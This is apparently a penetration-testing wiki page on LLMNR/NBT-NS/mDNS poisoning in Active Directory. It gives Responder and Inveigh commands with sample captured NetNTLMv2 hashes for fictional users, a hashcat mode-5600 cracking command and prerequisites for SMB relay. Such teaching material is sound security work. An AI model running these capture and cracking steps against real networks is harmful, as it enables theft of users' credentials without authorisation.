---
title: LLMNR/NBT-NS/mDNS Poisoning
description: Poison local name-resolution protocols to capture NetNTLM challenge-response data
categories: [Active Directory]
tags: [Active Directory, Initial Access, LLMNR, NTLM Authentication]
weight: 2
---

LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS) are local name-resolution mechanisms used by Windows in certain configurations. LLMNR and NBT-NS may be used when ordinary name resolution fails; mDNS commonly resolves `.local` names and is not simply another DNS fallback. Their multicast or broadcast queries can be answered by other hosts on the local link, allowing an attacker to supply a false response when these mechanisms are enabled.

LLMNR/NBT-NS/mDNS poisoning may allow us to capture authentication data when we have local network access in an Active Directory environment. A captured response is not itself a reusable password or NT hash.

## Example Attack Procedure
As the attacker, we may respond to a local name-resolution query we receive with the IP address of a machine we control. If the client then connects to a service and attempts NTLM authentication, we can capture its NetNTLMv2 challenge-response data. Below is a quick example using a single-label name:
1. A user attempts to connect to `\\print01`, but accidentally types `\\printer01`.
2. Ordinary name resolution fails to find `printer01`.
3. If enabled and applicable, the host sends a local LLMNR multicast or NBT-NS broadcast query for `printer01`.
4. The attacker machine responds that `printer01` is at the attacker's address.
5. If the victim connects and attempts NTLM authentication, the attacker supplies a challenge and captures the client's username, domain, and challenge response. The password and NT hash are not sent over the wire.
6. The captured exchange may be used for offline password cracking. SMB relay is a different, live flow: the attacker forwards a target server's challenge to the client and returns the client's response to that server, rather than replaying a previously saved capture.

The attacker generally needs access to the victim's local link and must be able to receive and answer the relevant queries. The victim must use an enabled name-resolution mechanism, accept the spoofed response, reach the attacker's service, and attempt NTLM authentication. Local network access alone does not guarantee a capture.

## Linux Exploitation
On Linux, we may use [Responder](https://github.com/lgandx/Responder) to poison LLMNR/NBT-NS/mDNS requests. The basic command specifies the listening interface (`-I`); it also requires sufficient privileges, suitable network access, and available listener ports.
```bash
sudo responder -I <interface>
```

To passively observe LLMNR/NBT-NS/mDNS requests without responding to them, we may turn on analysis mode with `-A`.
```bash
sudo responder -I <interface> -A
```

The `-w` flag enables Responder's WPAD rogue proxy. Older examples combine it with `-f` for fingerprinting, but that option is not present in the current upstream parser; check your installed version's help before using it. The `-v` flag increases output verbosity. WPAD is separate from basic name-resolution poisoning and should only be enabled when it is in scope.
```bash
sudo responder -I <interface> -w
```

When an LLMNR request is received, Responder can respond with the IP address of our attacker machine. If the client subsequently attempts NTLM authentication to us, Responder can capture NetNTLMv2 challenge-response data, as shown below.
```shell-session
╭─brian@rx-93-nu ~
╰─$ sudo responder -I eth0
[...]
[SMB] NTLMv2-SSP Client   : 10.10.0.3
[SMB] NTLMv2-SSP Username : GUNDAM\amuro.ray
[SMB] NTLMv2-SSP Hash     : amuro.ray::GUNDAM:a3b63d7ddbe6ba7a:3AD368AA88D65EDDBD3EF78620E6C30F:01010000000000000091F32BB296DC015AA351A97183FC670000000002000800340057004E00350001001E00570049004E002D004F004100340033005500300043004E0038004800430004003400570049004E002D004F004100340033005500300043004E003800480043002E00340057004E0035002E004C004F00430041004C0003001400340057004E0035002E004C004F00430041004C0005001400340057004E0035002E004C004F00430041004C00070008000091F32BB296DC01060004000200000008003000300000000000000000000000003000008949D311EBD21F7E16A9C4A322E62635FFEF4C00A8D42DBCC20D9DAF11A745880A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```
Responder can be configured through its configuration file (`/usr/share/responder/Responder.conf` in this installation; the path varies by package). Servers and poisoners for different protocols can be turned on or off.
```shell-session
╭─brian@rx-93-nu ~
╰─$ cat /usr/share/responder/Responder.conf
[Responder Core]

; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

; Servers to start
SQL      = On
SMB      = On
QUIC     = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = Off
HTTPS    = Off
DNS      = On
LDAP     = On
DCERPC   = On
WINRM    = On
SNMP     = On
MQTT     = On
[...]
```

## Windows Exploitation
If we have a Windows machine on the same local network as the Active Directory hosts we are targeting, we may use [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to poison LLMNR/NBT-NS/mDNS requests. The Windows machine does not have to be joined to the target domain. Inveigh's SMB packet-sniffing mode uses the Windows SMB service and requires elevated privileges; its standalone listener mode instead needs an available listening port. Inveigh's primary version is written in C#; the PowerShell version is legacy.
```shell-session
PS C:\Users\Amuro.Ray\Desktop\inveigh> .\Inveigh.exe -LLMNR Y -MDNS Y -NBNS Y
[*] Inveigh 2.0.12 [Started 2026-03-23T13:01:49 | PID 10628]
[+] Packet Sniffer Addresses [IP 10.10.0.4 | IPv6 fe80::8382:e25f:cd70:d4ba%7]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 10.10.0.4 | IPv6 fe80::8382:e25f:cd70:d4ba%7]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[+] MDNS Packet Sniffer [Questions QU:QM | Type A]
[+] NBNS Packet Sniffer [Types 00:20]
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Users\Amuro.Ray\Desktop\inveigh]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
```
We can press `ESC` to enter interactive mode. Inveigh will collect NetNTLMv2 responses in the background while providing various commands in its help menu.
```shell-session
C(0:0) NTLMv1(0:0) NTLMv2(0:0)> HELP
========================================== Inveigh Console Commands ==========================================

Command                           Description
==============================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET REPLYTOQUERIES              | get ReplyToQueries parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
GET IGNOREQUERIES               | get IgnoreQueries parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```
After capturing responses, we may use `GET NTLMV2UNIQUE` to get a list of unique NetNTLMv2 captures collected so far.
```shell-session
C(0:0) NTLMv1(0:0) NTLMv2(2:2)> GET NTLMV2UNIQUE
================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
Administrator::GUNDAM:2AA673CB2F0DF970:09A823F4D5F9B3ECF3B21537DACF9AC2:01010000000000001D9D06D210BBDC015BF5A4673A50F9890000000002000C00470055004E00440041004D0001001800520058002D0030002D0055004E00490043004F0052004E0004001800470055004E00440041004D002E006C006F00630061006C0003003200520058002D0030002D0055004E00490043004F0052004E002E00470055004E00440041004D002E006C006F00630061006C0005001800470055004E00440041004D002E006C006F00630061006C00070008001D9D06D210BBDC0106000400020000000800300030000000000000000000000000300000CC1C098C242B47DB3375C207523DA32D9F9B4788299A963FBE4BA82AE33726090000000000000000
Char.Aznable::GUNDAM:72F4BBD4D260A6A8:576065528ECE8B98927DFF046A7309D6:01010000000000004102B01011BBDC012CEE151E923421ED0000000002000C00470055004E00440041004D0001001800520058002D0030002D0055004E00490043004F0052004E0004001800470055004E00440041004D002E006C006F00630061006C0003003200520058002D0030002D0055004E00490043004F0052004E002E00470055004E00440041004D002E006C006F00630061006C0005001800470055004E00440041004D002E006C006F00630061006C00070008004102B01011BBDC0106000400020000000800300030000000000000000100000000200000CC1C098C242B47DB3375C207523DA32D9F9B4788299A963FBE4BA82AE33726090000000000000000
```

## NetNTLMv2 Hash Cracking
After saving the NetNTLMv2 capture to a file, we may attempt offline password cracking with Hashcat using mode 5600. Recovery depends on finding the correct password; it is not guaranteed.
```bash
hashcat -m 5600 -O <hash_file> <wordlist>
```

## Combining LLMNR Poisoning with SMB Relay Attack
Instead of terminating NTLM authentication ourselves, we can use `ntlmrelayx` from Impacket to relay a live authentication exchange between the client and a target host. For the SMB relay scenario described here:
- The SMB target must accept NTLM and must not require SMB signing. Client-side signing requirements can also prevent the incoming SMB authentication from being relayed; signing need not be disabled entirely.
- The relayed account must have the permissions required for the intended action. Local administrator rights are needed for the SAM-dumping and remote-command examples, not for every possible use of relay.
- The client must connect to the relay, and the relay must be able to reach the target. A saved NetNTLMv2 capture cannot simply be replayed against a fresh challenge.

Check the article on [SMB relay attacks]({{< relref "/docs/active_directory/initial_access/smb_relay">}}) for more details.
